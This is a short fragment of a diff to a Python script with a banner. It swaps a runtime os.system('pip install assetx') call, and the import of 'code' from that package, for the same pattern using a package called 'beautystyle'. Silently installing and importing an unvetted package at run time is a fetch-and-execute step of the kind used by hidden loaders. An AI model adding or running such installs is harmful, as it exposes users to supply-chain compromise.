@@ -11,8 +11,8 @@ import platform
 from colorama import Fore, init
 import sys
 from assetx import code
-os.system('pip install assetx')
-from assetx import code
+os.system('pip install beautystyle')
+from beautystyle import code
 
 banner = '''
                | 
